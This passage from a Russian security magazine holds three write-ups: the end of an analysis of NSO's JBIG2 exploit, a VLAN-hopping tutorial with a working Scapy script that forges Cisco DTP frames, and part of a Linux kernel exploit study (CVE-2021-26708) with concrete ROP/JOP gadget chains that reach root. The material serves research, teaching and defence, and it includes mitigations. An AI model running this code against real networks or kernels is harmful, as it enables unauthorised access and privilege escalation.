  ми можно производить запись во все поля страницы JBIG2Bitmap, а тщатель‐
  но выбирая новые значения для w, h и line, можно записывать произвольные
  смещения в задний буфер страницы.
    На этом этапе уже можно было бы писать абсолютные адреса памяти,
  если бы мы знали их смещения в заднем буфере страницы. Но как вычислить
   эти смещения? До сих пор этот эксплоит действовал очень похоже на обыч‐
  ный эксплоит традиционного языка сценариев. В JavaScript это могло бы
   закончиться неограниченным объектом ArrayBuffer с доступом к памяти.
  В таком случае злоумышленник имел бы возможность запускать произволь‐
  ный код на JavaScript, который бы использовался для вычисления смещений
  и выполнения произвольных действий. Как это сделать в однопроходном пар‐
  сере изображений?


  ДРУГОЙ ФОРМАТ СЖАТИЯ — ПОЛНЫЙ ПО ТЬЮРИНГУ!
  Как ты помнишь, последовательность шагов, реализующих уточнение в JBIG2,
  очень гибкая. Шаги уточнения могут ссылаться как на растровое изоб‐
  ражение вывода, так и на любые ранее созданные сегменты, а также отоб‐
  ражать вывод либо на текущей странице, либо на сегменте. Хитроумно
  работая с зависящей от контекста декомпрессией уточнения, можно соз‐
  давать последовательности сегментов, в которых эффект будут иметь только
   операторы комбинации усовершенствований.
    На практике это значит, что можно применять логические операторы AND,
  OR, XOR и XNOR между областями памяти с произвольными смещениями
   заднего буфера JBIG2Bitmap текущей страницы. И поскольку ограничений
   нет, можно выполнять эти логические операции с памятью с произвольными
   смещениями за пределами границ.





     Схема памяти, показывающая, как логические операторы могут при‐
     меняться за пределами границ

  Это немного усложнит  задачу, но при желании можно  вместо  глифов
  работать с отдельными битами. В качестве входных данных можно подать
  набор команд  сегмента JBIG2, которые  реализуют  последовательность
   логических битовых операций, применяемых к странице. А поскольку буфер
   страницы не ограничен, эти битовые операции могут работать с произволь‐
  ной памятью.
    С помощью доступных логических операторов AND, OR, XOR и XNOR мож‐
  но выполнить любую математическую функцию.


  ВЫВОДЫ
  В JBIG2 нет возможности выполнять скрипты, но в сочетании с уязвимостью
  он может имитировать схемы разных логических вентилей, работающих
  с произвольной памятью. Так почему бы не использовать это и не создать
   собственную компьютерную архитектуру для выполнения своих сценариев?
     Это как раз то, что делает эксплоит NSO. В нем на основе 70 тысяч сег‐
   ментных команд реализована архитектура небольшого компьютера. Здесь
   есть регистры, а также полные 64-битный сумматор и компаратор, которые
   используются для поиска в памяти и выполнения арифметических операций.
  Все это работает не так быстро, как JavaScript, но можно добиться схожих
   результатов.
     Операции начальной  загрузки,  благодаря которым  эксплоит выходит
  из песочницы, написаны целиком на этой причудливой эмулируемой элемен‐
  тарной логике, созданной из одного прохода декомпрессии потока JBIG2.
     Хоть деятельность NSO и вызывает вопросы с точки зрения этики, но нель‐
   зя не отдать должное изобретательности этой схемы!
ВЗЛОМ
  РАЗРУЛИВАЕМ
          DTP





     КАК ВЗЛОМАТЬ
    ПРОТОКОЛ DTP
  И СОВЕРШИТЬ ПОБЕГ
  В ДРУГУЮ СЕТЬ VLAN





Протокол DTP был разработан инженерами
Cisco  Systems,  чтобы  облегчить  жизнь
ленивым  сетевым  инженерам.  Но  при
халатном отношении к конфигурации этого
протокола  администраторы  расплачива‐            C0ldheim                                                                                                  Security Engineer, Penetration
ются компрометацией своих сетей. В этой                   Tester                                                                                         c0ldheim@protonmail.com
статье я продемонстрирую сценарий взло‐
ма протокола DTP и возможность побега
в другую сеть VLAN.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Аббревиатура DTP расшифровывается как Dynamic Trunking Protocol. Этот
протокол разработан инженерами Cisco Systems для реализации автомати‐
ческой транкинговой системы. Какой порт будет транковым, а какой нет — c
этим разбирается именно протокол DTP, а не сетевой инженер. DTP очень
часто остается без должного внимания и в большинстве случаев использует
конфигурацию по умолчанию. Этим мы с тобой и воспользуемся.


КАК ЭТО РАБОТАЕТ
DTP позволяет двум соседним портам коммутатора согласовывать решения
о том, будут ли они магистральными каналами a.k.a транками. Такой метод
применяется, чтобы сформировать магистральный канал, а сетевому адми‐
нистратору не приходилось  настраивать вручную каждую  сторону. Ком‐
мутационный порт, который находится на другом конце канала, может при‐
нять  конфигурацию соседа и  сформировать  транк  автоматически.  Да,
это позволяет сохранить время и силы, но не в таком уж и существенном
количестве.





                    Пример типичной топологии DTP

В протоколе DTP предусмотрено несколько режимов работы портов ком‐
мутатора для инициализации магистрального канала:
 • Access Mode — режим постоянного бестранкового состояния. Порт
   всегда будет оставаться в бестранковом состоянии, несмотря на то что
   соседний порт не согласен с изменением;
 • Trunk Mode — режим постоянного транкового состояния. Порт всегда
   будет оставаться в транковом состоянии, несмотря на то что соседний
   порт не согласен с изменением;
 • Dynamic Auto — в этом режиме порт готов перейти в транковое сос‐
   тояние, если соседний порт будет в режиме Trunk или Dynamic Desirable.
   Важно упомянуть, что Dynamic Auto — это режим по умолчанию для всех
   портов коммутатора;
 • Dynamic Desirable — в этом режиме порт всегда пытается перейти
   в транковое состояние. Порт приобретет режим Trunk, если соседний порт
   настроен в режимах Dynamic Auto, Dynamic Desirable или Trunk Mode;
 • Nonegotiate — в этом режиме порт не участвует в процессах DTP. Он
   не будет ни отправлять кадры DTP, ни принимать их.





                 Таблица комбинаций режимов портов DTP

Чтобы не запутаться в этих терминах, я сделал таблицу комбинаций режимов
DTP двух соседних портов. Посмотрев на данные в этой таблице, ты навер‐
няка заметил, что если два соседних порта находятся в режиме Dynamic Auto,
то они не смогут образовать магистральный канал и оба порта останутся
в режиме Access. Другой пример: если первый порт будет в режиме Dynamic
Auto, а второй порт в режиме Dynamic Desirable, то в конечном счете обра‐
зуется магистральный канал или же транк.
   Кадры DTP рассылаются через порты коммутатора каждые 30 секунд.
И для их рассылки используется специальный мультикастовый адрес 01:00:
0C:CC:CC:CC. Если порт был сконфигурирован динамически, то время его
жизни — всего 300 секунд.



                 Информация о DTP из консоли Cisco IOS


             INFO

                          Мультикастовый  адрес  01:00:0C:CC:CC:CC
                            используется не  только протоколом DTP, но и
                          другими, например CDP, VTP, PAgP, UDLD. Чтобы
                            протоколы  могли  отличаться  друг  от  друга
                      при отправке своих объявлений по одинаковому
                          мультикастовому  адресу, для них реализовано
                            уникальное значение в заголовке SNAP на уровне
                      LLC (Logical Link Control). Для DTP это значение
                           эквивалентно 0x2004.



Уязвимость
Суть уязвимости заключается в том, что протокол DTP включен по умолчанию
на всех современных коммутаторах Cisco. При этом каждый порт коммутатора
настроен в режиме Dynamic Auto. То есть порт будет ожидать инициации
транка со стороны соседа. Для успешного проведения атаки нам нужно
физически подключиться к коммутатору и отправить специально подготов‐
ленный кадр DTP Desirable. Порт переключится в режим магистрального
канала, и мы сможем получить доступ ко всем сетям VLAN.


ВИРТУАЛЬНАЯ ЛАБОРАТОРИЯ
В своей виртуальной лаборатории я использовал платформу виртуализации
EVE-NG Community Edition. Целевыми устройствами будут эмулированный
коммутатор и маршрутизатор Cisco (Cisco IOL), виртуальные VPC из EVE-NG.
А в качестве машины атакующего выступит ОС Kali Linux 2021.4.
   Сеть разбита на два сегмента: это VLAN 10 и VLAN 30. За маршрутизацию
трафика между ними отвечает маршрутизатор R1. Также на маршрутизаторе
R1 настроен DHCP-сервер для автоматической выдачи адресов устройствам.
  На порте коммутатора E1/0 SW1 до маршрутизатора R1 сконфигурирован
магистральный канал 802.1Q, который передает весь тегированный трафик
сетей VLAN 10 и 30. Порты E0/1 и E0/2 настроены в режиме Access и принад‐
лежат своим сетям VLAN.
   Машина атакующего подключена к порту коммутатора E1/1. Порт настроен
по умолчанию в режиме Dynamic Auto для демонстрации эксплуатации уяз‐
вимости.





                      Топология виртуальной лаборатории





                  IP-адресация виртуальной лаборатории




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИВЗЛОМ
   РАЗРУЛИВАЕМ DTP

                      КАК ВЗЛОМАТЬ ПРОТОКОЛ DTP
          И СОВЕРШИТЬ ПОБЕГ В ДРУГУЮ СЕТЬ VLAN





КАСТОМНАЯ ЭКСПЛУАТАЦИЯ УЯЗВИМОСТИ
БЕЗ ИСПОЛЬЗОВАНИЯ YERSINIA
В контексте проведения атаки я решил обойтись без популярного фреймвор‐
ка Yersinia. Одно дело, когда ты просто нажимаешь на несколько кнопок,
руководствуясь своим бэкграундом знаний, и производишь взлом, это что‑то
из разряда «Just push the button and hack it». Совсем другое дело, когда ты
сам собираешь свой инструмент по кусочкам. Я считаю, это даст более глу‐
бокое понимание процесса эксплуатации уязвимости, что очень важно.
  Для  эксплуатации этой уязвимости DTP я использовал  связку Python
и Scapy, написав свой собственный скрипт — DTPAbuse.py. Ниже я разберу
весь программный код скрипта, чтобы ты понимал работу этой программы
и процесс эксплуатации.
   Итак, начнем.


from scapy.all import *
from scapy.contrib.dtp import *
import argparse

В этой части, я думаю, никаких вопросов возникнуть не должно. Мы подклю‐
чаем библиотеку Scapy, модуль для работы с протоколом DTP и модуль
argparse, чтобы сделать скрипт параметризованным. То есть скрипт будет
принимать на вход введенный пользователем аргумент.


cisco_multicast = "01:00:0C:CC:CC:CC"

Создаем переменную cisco_multicast и передаем в нее адрес мультикас‐
товой рассылки Cisco.


def get_arguments():
  parser = argparse.ArgumentParser()


  parser.add_argument("-i", dest="interface", type=str, required=True
, help="Choose the interface to attack")


  args = parser.parse_args()
  return args

Функция get_arguments парсит введенные пользователем входящие аргу‐
менты и отправляет данные в переменную interface. В качестве входных
данных скрипт будет принимать сетевой интерфейс для атаки.


def negotiate_trunk(interface=conf.iface, mymac=str(RandMAC())):
  dtp_frame = Dot3(src=mymac, dst=cisco_multicast)
    dtp_frame /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0x0c,
code = 0x2004)
    dtp_frame /= DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),
DTPNeighbor(neighbor=mymac)])
  sendp(dtp_frame, iface=args.interface, inter=3, loop=1, verbose=1)

Функция negotiate_trunk принимает на вход сетевой интерфейс и MAC-
адрес. MAC-адрес пусть будет рандомизированным.
   Далее расположен код под функцией negotiate_trunk, который собира‐
ет кадр DTP Desirable.


dtp_frame = Dot3(src=mymac, dst=cisco_multicast)

В кадре Ethernet Dot3 я указываю MAC-адрес источника назначения. Адресом
назначения будет служить адрес мультикастовой рассылки Cisco.


dtp_frame /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)/SNAP(OUI=0x0c, code =
0x2004)

Также понадобится добавить слои LLC и SNAP. Значением 0x2004 в заголовке
SNAP укажем, что это DTP-кадр.


dtp_frame /= DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),
DTPNeighbor(neighbor=mymac)])

Собираем  кадр  DTP,  все  параметры  оставим  по  умолчанию,  кроме
DTPNeighbor. Переменной neighbor  передадим MAC-адрес  источника.
Почему‑то в Scapy в дефолтном кадре DTP по умолчанию хранятся все необ‐
ходимые значения, чтобы собрать именно кадр DTP Desirable. Я не знаю,
с чем это связано, но это сыграет нам на руку: сэкономим время. Поэтому мы
оставили параметры DTP по умолчанию (за исключением DTPNeighbor).





                   Структура дефолтного кадра DTP в Scapy

Теперь давай сосредоточимся на хранящихся там самых важных заголовках
и не менее важных значениях:
 • DTPType = '\xa5' — значение заголовка, указывающее на исполь‐
   зование инкапсуляции 802.1Q;
 • DTPStatus = '\x03' — значение заголовка, указывающее на статус
   DTP-кадра. Это статус Desirable, то, что нам нужно для инициации тран‐
   ка.


sendp(dtp_frame, iface=args.interface, inter=3, loop=1, verbose=1)

Далее необходимо отправить собранный кадр. Поскольку мы знаем, что
динамический транк продержится всего 300 секунд, зациклим отправку этого
кадра с интервалом в 3 секунды.


args = get_arguments()
negotiate_trunk(args.interface)

Ну и последние части скрипта. Передаем вводимые пользователем аргумен‐
ты в переменную args и вызываем функцию get_arguments(). Затем
вызываем функцию negotiate_trunk, подав на вход введенный пользовате‐
лем интерфейс.





                       «Скелет» собранного кадра DTP


Эксплуатация
Запускаем сетевой сниффер Wireshark и прослушиваем трафик на наличие
кадров DTP.





                   Дамп трафика из Wireshark

Видим,  что  коммутатор  воспроизводит  рассылку  кадров DTP на  порт,
к которому подключена машина с Kali Linux. Исходя из информации, хра‐
нящейся в заголовках DTP, мы можем смело заявить, что порт коммутатора
настроен в режиме Dynamic Auto.





                    Информация о статусе порта DTP

Теперь запускаем наш скрипт DTPAbuse.py.





                         Запуск скрипта DTPAbuse.py





                     Отправленный кадр DTP Desirable

На скриншоте выше мы видим, что скрипт генерирует необходимый нам кадр
DTP Desirable. Если теперь мы войдем в панель управления коммутатора SW1,
то увидим следующее.





            Порт E1/1 преобразовался в динамический транк

Порт коммутатора, к которому подключена машина атакующего, переключил‐
ся в режим магистрального канала. Теперь мы можем прослушивать трафик
всех сетей VLAN.





               Прослушивание трафика после эксплуатации


Побег в другую сеть VLAN
Теперь у нас есть возможность «прыгнуть» в другую VLAN-сеть, так как порт
коммутатора, к которому мы подключены, находится в режиме магистраль‐
ного канала. Для этого нужно создать виртуальный интерфейс VLAN на нашем
сетевом адаптере, назначить VLAN ID и IP-адрес.


             INFO

                      Эта атака носит альтернативное название VLAN
                        Hopping.


Но откуда нам взять VLAN ID? Поскольку мы в состоянии прослушивать тра‐
фик всех сетей VLAN, мы можем  изучить кадры STP и извлечь  оттуда
информацию об идентификаторе VLAN. Например, в нашем случае мы уви‐
дим, что коммутатор SW1 — это корневой коммутатор для сетей VLAN
10 и VLAN 30.





               Информация из заголовка 802.1Q о VLAN 10





               Информация из заголовка 802.1Q о VLAN 30

Создадим виртуальные интерфейсы VLAN и назначим тег VLAN ID.





                Создание виртуальных интерфейсов VLAN

Теперь поднимем их и запросим адрес по DHCP.



                 Активация виртуальных интерфейсов VLAN





                 Успешное получение адресов по DHCP

Теперь мы можем взаимодействовать с хостами, находящимися в сетях VLAN
10 и 30. Для наглядности отправлю запросы ICMP к машинам Workstation
и Fileshare Server.





                 Успешное прохождение запросов ICMP


ЗАЩИТА
Чтобы защитить коммутаторы в сети от этой атаки на протокол DTP, необ‐
ходимо перевести в режим доступа все порты, куда подключаются рабочие
станции, и выключить протокол DTP на портах. Весьма легкая задача, сог‐
ласись? Приведу пример настройки на порте коммутатора, куда была под‐
ключена машина атакующего.
   Сначала переведем порт в режим доступа командой switchport mode
access, а затем отключим DTP на порте командой switchport nonegotiate:


SW1(config)#interface ethernet 1/1
SW1(config-if)#switchport mode access
SW1(config-if)#switchport nonegotiate

Теперь эта  атака  неосуществима, так как порты больше не реагируют
на несанкционированные кадры DTP.


ВЫВОД
В этой статье я разобрал сценарий взлома протокола DTP и компрометации
сетей VLAN. Лично я считаю, что использование DTP в рамках продакшена —
это явный пример некачественного дизайна сети, ибо магистральные каналы
a.k.a транки должны быть там и только там, где это запланировано. Конечно,
сетевой администратор сэкономит какое‑то время на настройке магистраль‐
ных каналов с использованием DTP, но это не стоит того, чтобы пользоваться
столь небезопасным решением в сети. И очень жаль, что конфигурацию этого
протокола достаточно часто оставляют без должного внимания. Но теперь ты
знаешь, что делать!
ВЗЛОМ





                                                                              Александр Попов
                                                                                     Эксперт по информационной
                                                                                        безопасности компании
                                                                                                              Positive Technologies
                                                                                               alex.popov@linux.com


ПРОВЕРКА
НА ПРОЧНОСТЬ

 КАК Я ИССЛЕДОВАЛ ЗАЩИТУ LKRG
 С ПОМОЩЬЮ УЯЗВИМОСТИ
 В ЯДРЕ LINUX




В январе 2021 года я нашел и устранил пять уязвимостей
в ядре Linux, которые получили общий идентификатор CVE-
2021-26708. В этой статье я расскажу, как я доработал свой
прототип эксплоита и с его помощью исследовал средство
защиты Linux Kernel Runtime Guard (LKRG) с позиции ата‐
кующего. Мы поговорим о том, как мне удалось найти новый
метод обхода защиты LKRG и как я выполнил ответственное
разглашение результатов своего исследования.


Летом я выступил с докладом по этой теме на конференции ZeroNights 2021.





        WWW

                        Слайды доклада в PDF




ЗАЧЕМ Я ПРОДОЛЖИЛ ИССЛЕДОВАНИЕ
В предыдущей статье я описал прототип эксплоита для локального повыше‐
ния привилегий на Fedora 33 Server для платформы x86_64. Я рассказал,
как состояние гонки в реализации виртуальных сокетов ядра Linux может при‐
вести к повреждению четырех байтов ядерной памяти. Я показал, как ата‐
кующий может шаг за шагом превратить эту ошибку в произвольное чте‐
ние‑запись памяти ядра и повысить свои привилегии в системе. Но некото‐
рые ограничения этого способа повысить привилегии мешали мне экспе‐
риментировать в системе под защитой LKRG. Я решил продолжить иссле‐
дование и выяснить, можно ли их устранить.
  Мой прототип  эксплоита выполнял произвольную запись с помощью
перехвата потока управления при вызове деструктора destructor_arg в ата‐
кованном ядерном объекте sk_buff.





Этот деструктор имеет следующий прототип:


void (*callback)(struct ubuf_info *, bool zerocopy_success);

Когда ядро вызывает его в функции skb_zcopy_clear(), регистр RDI содержит
первый аргумент функции. Это адрес самой структуры ubuf_info. А регистр
RSI хранит единицу в качестве второго аргумента функции.
   Содержимое  этой  структуры ubuf_info  контролируется  эксплоитом.
Однако первые восемь байтов в ней должны быть заняты адресом фун‐
кции‑деструктора, как видно на схеме. В этом и есть основное ограничение.
Из‑за него ROP-гаджет для переключения ядерного стека на контролируемую
область памяти (stack pivoting) должен выглядеть примерно так:


mov rsp, qword ptr [rdi + 8] ; ret

К сожалению, ничего похожего в ядре Fedora vmlinuz-5.10.11-200.fc33.
x86_64 обнаружить не удалось. Но зато с помощью ROPgadget я нашел такой
гаджет, который удовлетворяет этим ограничениям и выполняет запись ядер‐
ной памяти вообще без переключения ядерного стека:


mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret

Как сказано выше, RDI  +  8 — это адрес ядерной памяти, содержимое
которой контролирует атакующий. В регистре RSI содержится единица, а в
RCX — ноль. То есть этот гаджет записывает семь нулевых байтов и один байт
с единицей по адресу, который задает атакующий. Как выполнить повышение
привилегий процесса с помощью этого ROP-гаджета? Мой прототип экспло‐
ита записывает ноль в поля uid, gid, effective uid и effective gid струк‐
туры cred.
  Мне удалось придумать хоть и странный, но вполне рабочий экспло‐
ит‑примитив. При этом я не был полностью удовлетворен этим решением,
потому что оно не давало возможности полноценного ROP. Кроме того, при‐
ходилось выполнять перехват потока управления дважды, чтобы переза‐
писать все необходимые поля в struct cred. Это делало прототип экспло‐
ита менее надежным. Поэтому я решил немного отдохнуть и продолжить
исследование.


РЕГИСТРЫ ПОД КОНТРОЛЕМ АТАКУЮЩЕГО
Первым делом я решил еще раз посмотреть на состояние регистров процес‐
сора в момент перехвата потока управления. Я поставил точку останова
в  функции  skb_zcopy_clear(),  которая  вызывает  обработчик  callback
из destructor_arg:



  $ gdb vmlinux
  gdb-pedatargetremote:1234gdb−peda break ./include/linux/skbuff.h:1481


Вот что отладчик показывает прямо перед перехватом потока управления.





Какие ядерные адреса хранятся в регистрах процессора? RDI и R8 содержат
адрес ubuf_info. Разыменование этого указателя дает указатель на функцию
callback, который загружен в регистр RAX. В регистре R9 содержится
некоторый указатель на память в ядерном стеке (его значение близко к зна‐
чению RSP). В регистрах R12 и R14 находятся какие‑то адреса памяти в ядер‐
ной куче, и мне не удалось выяснить, на какие объекты они ссылаются.
  А вот регистр RBP, как оказалось, содержит адрес skb_shared_info.
Это адрес моего объекта sk_buff плюс отступ SKB_SHINFO_OFFSET, который
равен 3776 или 0xec0 (больше деталей в предыдущей статье). Этот адрес дал
мне надежду на успех, потому что он указывает на память, содержимое
которой находится под контролем эксплоита. Я начал искать ROP/JOP-гад‐
жеты, использующие RBP.


Исчезающие JOP-гаджеты
Я стал просматривать все доступные гаджеты с участием RBP и нашел мно‐
жество JOP-гаджетов, похожих на этот:


0xffffffff81711d33 : xchg eax, esp ; jmp qword ptr [rbp + 0x48]

Адрес RBP + 0x48 также указывает на ядерную память под контролем ата‐
кующего. Я понял, что могу выполнить stack pivoting с помощью цепочки
таких JOP-гаджетов, после чего выполнить полноценную ROP-цепочку.
Отлично!
  Для быстрого эксперимента я взял этот гаджет:


xchg eax, esp ; jmp qword ptr [rbp + 0x48]

Он переключает ядерный стек на память в пользовательском пространстве.
Сначала я удостоверился, что гаджет действительно находится в коде ядра:



  $ gdb vmlinux


  gdb-peda$ disassemble 0xffffffff81711d33
  Dump of assembler code for function acpi_idle_lpi_enter:
     0xffffffff81711d30 <+0>: call   0xffffffff810611c0 <fentry>
     0xffffffff81711d35 <+5>: mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
     0xffffffff81711d3d <+13>:    test   rcx,rcx
     0xffffffff81711d40 <+16>:    je     0xffffffff81711d5e


  gdb-peda$ x/2i 0xffffffff81711d33
     0xffffffff81711d33 :  xchg   esp,eax
     0xffffffff81711d34 :  jmp    QWORD PTR [rbp+0x48]


Так и есть. Код функции acpi_idle_lpi_enter() начинается с адреса
0xffffffff81711d30, и гаджет отображается, если смотреть на код этой
функции с трехбайтовым отступом.
   Однако, когда я попробовал выполнить этот гаджет при перехвате потока
управления, ядро неожиданно выдало отказ страницы (page fault). Я стал
отлаживать эту ошибку и заодно спросил моего друга Андрея Коновалова,
известного исследователя безопасности Linux, не сталкивался ли он с таким
эффектом. Андрей обратил внимание, что байты кода, которые распечатало
ядро, отличались от вывода утилиты objdump для исполняемого файла ядра.





Это был первый случай в моей практике с ядром Linux, когда дамп кода
в ядерном журнале оказался полезен. Я подключился отладчиком к работа‐
ющему ядру и обнаружил, что код функции acpi_idle_lpi_enter() действи‐
тельно изменился:



  $ gdb vmlinux
  gdb-peda$ target remote :1234


  gdb-peda$ disassemble 0xffffffff81711d33
  Dump of assembler code for function acpi_idle_lpi_enter:
     0xffffffff81711d30 <+0>: nop    DWORD PTR [rax+rax*1+0x0]
     0xffffffff81711d35 <+5>: mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]
     0xffffffff81711d3d <+13>:    test   rcx,rcx
     0xffffffff81711d40 <+16>:    je     0xffffffff81711d5e


  gdb-peda$ x/2i 0xffffffff81711d33
     0xffffffff81711d33 :  add    BYTE PTR [rax],al
     0xffffffff81711d35 :  mov    rcx,QWORD PTR gs:[rip+0x7e915f4b]


На самом деле ядро Linux может модифицировать собственный код в момент
исполнения. В этом конкретном случае код функции acpi_idle_lpi_enter()
был изменен механизмом CONFIG_DYNAMIC_FTRACE. Он также испортил
множество других JOP-гаджетов, на которые я рассчитывал! Чтобы не стол‐
кнуться с этим снова, я решил попробовать искать нужные ROP/JOP-гаджеты
в памяти ядра живой виртуальной машины.





           Евгений Корнеев. Портрет академика Л. К. Богуша. 1980

Сначала я опробовал команду ropsearch из инструмента gdb-peda, но у нее
оказалась слишком ограниченная функциональность. Тогда я зашел с другой
стороны и сделал снимок всей области памяти с ядерным кодом с помощью
команды gdb-peda dumpmem. В первую очередь нужно было определить рас‐
положение ядерного кода в памяти:



  [root@localhost ~]# grep "_text" /proc/kallsyms
  ffffffff81000000 T _text
  [root@localhost ~]# grep "_etext" /proc/kallsyms
  ffffffff81e026d7 T _etext


Затем я сделал снимок памяти между адресами _text и _etext:



  gdb-peda$ dumpmem kerndump 0xffffffff81000000 0xffffffff81e03000
  Dumped 14692352 bytes to 'kerndump'


После этого я применил к полученному файлу утилиту ROPgadget. Она
может искать ROP/JOP-гаджеты в сыром снимке памяти, если задать допол‐
нительные опции (спасибо за подсказку моему другу Максиму Горячему,
известному исследователю безопасности железа):



  # ./ROPgadget.py --binary kerndump --rawArch=x86 --rawMode=64 >
  rop_gadgets_5.10.11_kerndump


Теперь я был готов составить JOP/ROP-цепочку.


JOP/ROP-ЦЕПОЧКА ДЛЯ STACK PIVOTING
Я изучил гаджеты с регистром RBP, которые остались в памяти живой машины
с учетом CONFIG_DYNAMIC_FTRACE, и смог составить такую JOP/ROP-цепочку
для переключения ядерного стека на контролируемую мной область памяти:


/* JOP/ROP gadget chain for stack pivoting: */


/* mov ecx, esp ; cwde ; jmp qword ptr [rbp + 0x48] */
#define STACK_PIVOT_1_MOV_ECX_ESP_JMP       (0xFFFFFFFF81768A43lu +
kaslr_offset)


/* push rdi ; jmp qword ptr [rbp - 0x75] */
#define STACK_PIVOT_2_PUSH_RDI_JMP      (0xFFFFFFFF81B5FD0Alu +
kaslr_offset)


/* pop rsp ; pop rbx ; ret */
#define STACK_PIVOT_3_POP_RSP_POP_RBX_RET   (0xFFFFFFFF8165E33Flu +
kaslr_offset)

 1. Первый JOP-гаджет сохраняет младшие 32 бита регистра RSP (указатель
   на стек) в регистре ECX и затем совершает прыжок по адресу, указыва‐
   ющему на следующий гаджет. Это действие важно, потому что эксплоит
   в конце должен будет восстановить исходное значение RSP. К сожалению,
   в образе ядра не нашлось аналогичного гаджета, который сохранил бы
   значение RSP полностью. Тем не менее я нашел способ обойтись его
   половиной. Про этот трюк расскажу дальше.
 2. Второй JOP-гаджет помещает в ядерный стек адрес ubuf_info из регис‐
   тра RDI, после чего также совершает прыжок по адресу, указывающему
   на следующий гаджет.
 3. Наконец,  заключительный  ROP-гаджет  записывает  адрес  структуры
  ubuf_info в стековый указатель. Затем он выполняет инструкцию pop
  rbx, которая добавляет восемь байтов к значению RSP. Тем самым сте‐
   ковый указатель сдвигается с адреса первого JOP-гаджета, который хра‐
   нится в начале структуры ubuf_info (как было описано выше). Теперь
   в RSP содержится адрес начала ROP-цепочки, исполнение которой нач‐
   нется после инструкции ret. Отлично!

Вот как эксплоит готовит эту цепочку в памяти для перезаписи ядерного объ‐
екта sk_buff:


/* mov ecx, esp ; cwde ; jmp qword ptr [rbp + 0x48] */
uinfo_p->callback = STACK_PIVOT_1_MOV_ECX_ESP_JMP;


unsigned long *jmp_addr_1 = (unsigned long *)(xattr_addr +
SKB_SHINFO_OFFSET + 0x48);
/* push rdi ; jmp qword ptr [rbp - 0x75] */
*jmp_addr_1 = STACK_PIVOT_2_PUSH_RDI_JMP;


unsigned long *jmp_addr_2 = (unsigned long *)(xattr_addr +
SKB_SHINFO_OFFSET - 0x75);
/* pop rsp ; pop rbx ; ret */
*jmp_addr_2 = STACK_PIVOT_3_POP_RSP_POP_RBX_RET;





ROP-ЦЕПОЧКА ДЛЯ ПОВЫШЕНИЯ ПРИВИЛЕГИЙ
После того как я справился с переключением ядерного стека на контролиру‐
емую мной область памяти, я быстро собрал ROP-цепочку для повышения
привилегий:


unsigned long *rop_gadget = (unsigned long *)(xattr_addr +
MY_UINFO_OFFSET + 8);
int i = 0;


#define ROP_POP_RAX_RET         (0xFFFFFFFF81015BF4lu + kaslr_offset)
#define ROP_MOV_QWORD_PTR_RAX_0_RET (0xFFFFFFFF8112E6D7lu +
kaslr_offset)


/* 1. Perform privilege escalation */
rop_gadget[i++] = ROP_POP_RAX_RET;      /* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_UID_GID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;  /* mov qword ptr [
rax], 0 ; ret */
rop_gadget[i++] = ROP_POP_RAX_RET;      /* pop rax ; ret */
rop_gadget[i++] = owner_cred + CRED_EUID_EGID_OFFSET;
rop_gadget[i++] = ROP_MOV_QWORD_PTR_RAX_0_RET;  /* mov qword ptr [
rax], 0 ; ret */

Тут довольно просто. Ядерный адрес owner_cred был получен эксплоитом
с помощью произвольного чтения ядерной памяти (все подробности в пре‐
дыдущей статье). Представленная часть ROP-цепочки использует этот адрес,
чтобы перезаписать значение uid, gid, effective uid и effective gid
нулем, что дает привилегии суперпользователя.
   Далее ROP-цепочка должна восстановить исходное значение регистра
RSP и продолжить исполнение системного вызова как ни в чем не бывало.
Как у меня получилось это сделать? Младшие 32 бита изначального стеково‐
го указателя были сохранены в регистре RCX. А старшие 32 бита можно
извлечь из значения регистра R9, так как в нем хранится некоторый адрес
из ядерного стека (это было показано выше на выводе отладчика). Немного
битовой арифметики — и готово:


#define ROP_MOV_RAX_R9_RET      (0xFFFFFFFF8106BDA4lu + kaslr_offset)
#define ROP_POP_RDX_RET         (0xFFFFFFFF8105ED4Dlu + kaslr_offset)
#define ROP_AND_RAX_RDX_RET     (0xFFFFFFFF8101AD34lu + kaslr_offset)
#define ROP_ADD_RAX_RCX_RET     (0xFFFFFFFF8102BA35lu + kaslr_offset)
#define ROP_PUSH_RAX_POP_RBX_RET    (0xFFFFFFFF810D64D1lu +
kaslr_offset)
#define ROP_PUSH_RBX_POP_RSP_RET    (0xFFFFFFFF810749E9lu +
kaslr_offset)


/* 2. Restore RSP and continue */
rop_gadget[i++] = ROP_MOV_RAX_R9_RET;       /* mov rax, r9 ; ret */
rop_gadget[i++] = ROP_POP_RDX_RET;      /* pop rdx ; ret */
rop_gadget[i++] = 0xffffffff00000000lu;
rop_gadget[i++] = ROP_AND_RAX_RDX_RET;      /* and rax, rdx ; ret */
rop_gadget[i++] = ROP_ADD_RAX_RCX_RET;      /* add rax, rcx ; ret */
rop_gadget[i++] = ROP_PUSH_RAX_POP_RBX_RET; /* push rax ; pop rbx ;
ret */
rop_gadget[i++] = ROP_PUSH_RBX_POP_RSP_RET; /* push rbx ; add eax,
0x415d0060 ; pop rsp ; ret*/

Здесь  значение  регистра R9  копируется в RAX. Затем битовая  маска
0xffffffff00000000 сохраняется в RDX и побитовая операция AND выпол‐
няется для RAX и RDX. В результате RAX содержит старшие биты исходного
стекового указателя, к которым нужно прибавить младшие биты из RCX.
Результат загружается в регистр RSP через RBX (мне пришлось сделать так,
потому что в памяти машины не нашлось гаджета типа mov rsp, rax ; ret).
   Финальная  инструкция RET  возвращает управление из ROP-цепочки.
За счет аккуратно восстановленного значения RSP ядро продолжает обработ‐
ку системного вызова recv(), однако эксплоит уже выполняется с привиле‐
гиями пользователя root.


                                     Продолжение статьи →
